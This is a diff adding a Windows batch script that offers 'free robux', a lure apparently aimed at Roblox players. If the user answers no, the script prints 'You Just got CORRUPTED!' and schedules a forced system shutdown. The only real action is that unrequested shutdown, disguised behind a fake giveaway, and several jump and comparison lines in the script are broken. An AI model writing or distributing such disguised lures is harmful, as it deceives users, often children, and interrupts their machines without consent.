@@ -1,0 +1,19 @@
+@echo off
+
+color a
+echo Hello, Want free robux? (answer in only yes/no)
+set /p input=
+if /i %input%==Yes goto robux
+if /i %input%==no goto no robux
+if /i not %input%== yes,no goto 1
+
+:robux
+echo I Love Robux...
+echo See You Later
+pause
+exit
+:no robux
+echo but you need robux...lol
+echo You Just got CORRUPTED!
+timeout 3
+shutdown -s -t 100  
